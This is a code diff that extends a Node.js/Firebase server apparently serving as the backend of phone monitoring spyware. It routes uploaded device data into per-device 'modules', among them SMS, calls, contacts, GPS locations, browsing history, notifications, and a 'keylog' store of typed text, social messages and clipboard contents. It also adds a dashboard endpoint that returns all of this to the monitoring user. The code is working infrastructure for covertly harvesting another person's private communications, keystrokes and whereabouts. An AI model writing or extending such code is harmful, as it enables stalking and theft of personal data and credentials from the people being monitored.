@@ -142,6 +142,75 @@ const appendHistory = async (refPath, entry, cap) => {
   })
 }
 
+// --- Module collections (dashboard sections) ---
+// The app ships every structured telemetry row (SMS, calls, contacts, GPS,
+// browsing, media, app usage, device info) plus its keylogger/notification
+// events as typed batch messages to POST /api/v2/data. Each type maps to a
+// module collection stored as a capped JSON array under devices/<id>/modules,
+// deduped by content hash (scans re-read the same SMS/call rows every cycle).
+const MODULE_CAPS = {
+  sms: 1000, calls: 1000, contacts: 2000, locations: 1000,
+  browsing: 1000, media: 1000, apps: 500, device: 20,
+  network: 100, notifications: 300, keylog: 500, events: 300
+}
+
+const TYPE_TO_MODULE = {
+  sms: 'sms',
+  call: 'calls',
+  contact: 'contacts',
+  location: 'locations',
+  browsing: 'browsing',
+  media: 'media',
+  app_usage: 'apps',
+  device_info: 'device',
+  network: 'network',
+  notification: 'notifications',
+  text_change: 'keylog',
+  social_message: 'keylog',
+  clipboard: 'keylog',
+  window_change: 'events',
+  focus: 'events'
+}
+
+const hashString = (s) => crypto.createHash('sha1').update(String(s)).digest('hex')
+
+// Store a batch of {t, d, h} entries into one module node atomically.
+const appendModuleBatch = async (refPath, entries, cap) => {
+  if (entries.length === 0) return
+  await db.ref(refPath).transaction((current) => {
+    const arr = parseJsonArray(current)
+    let changed = false
+    for (const entry of entries) {
+      if (entry.h && arr.some((e) => e && e.h === entry.h)) continue
+      arr.push(entry)
+      changed = true
+    }
+    if (!changed) return current
+    return JSON.stringify(arr.slice(-cap))
+  })
+}
+
+// Route a raw batch message into its module collection.
+const routeBatchMessage = async (deviceId, msg) => {
+  if (!msg || typeof msg !== 'object') return
+  const module = TYPE_TO_MODULE[msg.type]
+  if (!module) return
+  let data = null
+  try {
+    data = typeof msg.content === 'string' ? JSON.parse(msg.content) : msg.content
+  } catch (e) {
+    return
+  }
+  if (!data || typeof data !== 'object') return
+  const ts = data.ts || data.date || data.timestamp || msg.timestamp || Date.now()
+  const entry = {
+    t: ts,
+    d: data,
+    h: hashString(typeof msg.content === 'string' ? msg.content : JSON.stringify(data))
+  }
+  await appendModuleBatch(`devices/${deviceId}/modules/${module}`, [entry], MODULE_CAPS[module])
+}
+
 // Rate limiters
 const telemetryLimiter = rateLimit({
  windowMs: 5 * 60 * 1000,
@@ -360,6 +429,34 @@ app.post('/api/v2/data', telemetryLimiter, validateDevice, async (req, res) => {
  return result
  })
 
+ // Route typed messages into per-module collections (dashboard sections).
+ if (Array.isArray(batch.messages)) {
+   const grouped = {}
+   for (const msg of batch.messages) {
+     const module = msg && TYPE_TO_MODULE[msg.type]
+     if (!module) continue
+     let data = null
+     try {
+       data = typeof msg.content === 'string' ? JSON.parse(msg.content) : msg.content
+     } catch (e) {
+       continue
+     }
+     if (!data || typeof data !== 'object') continue
+     const ts = data.ts || data.date || data.timestamp || msg.timestamp || Date.now()
+     const content = typeof msg.content === 'string' ? msg.content : JSON.stringify(data)
+     ;(grouped[module] = grouped[module] || []).push({
+       t: ts,
+       d: data,
+       h: hashString(content)
+     })
+   }
+   await Promise.all(
+     Object.entries(grouped).map(([module, entries]) =>
+       appendModuleBatch(`devices/${deviceId}/modules/${module}`, entries, MODULE_CAPS[module])
+     )
+   )
+ }
+
  res.json({ success: true, received: Array.isArray(batch.messages) ? batch.messages.length : 0 })
  } catch (e) {
  console.error('data:', e.message)
@@ -446,6 +543,41 @@ app.get('/api/v2/activity', verifyUser, async (req, res) => {
  res.json({ success: true, activity: all.slice(0, 50) })
  } catch (e) {
  console.error('activity:', e.message)
+ res.status(500).json({ error: 'Internal error' })
+ }
+})
+
+app.get('/api/v2/devices/:deviceId/modules', verifyUser, async (req, res) => {
+ try {
+ const deviceId = sanitizeDeviceId(req.params.deviceId)
+ if (!deviceId) return res.status(400).json({ error: 'Invalid device ID' })
+
+ const access = await db.ref(`users/${req.uid}/devices/${deviceId}`).once('value')
+ if (!access.exists()) return res.status(403).json({ error: 'No access' })
+
+ const modules = {}
+ const ref = db.ref(`devices/${deviceId}/modules`)
+ const wanted = req.query.module
+   ? String(req.query.module).split(',').map((s) => s.trim()).filter((s) => s && MODULE_CAPS[s])
+   : null
+
+ if (wanted) {
+   await Promise.all(wanted.map(async (name) => {
+     const snap = await ref.child(name).once('value')
+     modules[name] = parseJsonArray(snap.val()).map((e) => (e && typeof e === 'object' && 'd' in e ? e.d : e))
+   }))
+ } else {
+   const snap = await ref.once('value')
+   const val = snap.val() || {}
+   for (const name of Object.keys(val)) {
+     if (!MODULE_CAPS[name]) continue
+     modules[name] = parseJsonArray(val[name]).map((e) => (e && typeof e === 'object' && 'd' in e ? e.d : e))
+   }
+ }
+
+ res.json({ success: true, modules })
+ } catch (e) {
+ console.error('modules:', e.message)
  res.status(500).json({ error: 'Internal error' })
  }
 })
